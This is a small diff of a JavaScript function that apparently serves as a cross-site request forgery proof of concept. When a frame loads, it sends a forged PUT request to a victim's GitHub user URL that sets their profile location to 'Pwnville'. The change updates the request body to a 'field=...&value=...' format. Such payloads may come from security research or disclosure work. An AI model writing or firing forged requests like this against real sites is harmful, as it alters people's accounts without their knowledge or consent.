@@ -25,7 +25,7 @@ function frameLoaded() {
    var userUrl = "http://github.com/users/"+currName;
    $.ajax({
      type:"PUT",
-     data:"profile_location=Pwnville",
+     data:"field=profile_location&value=Pwnville",
      url:userUrl
    });
 }
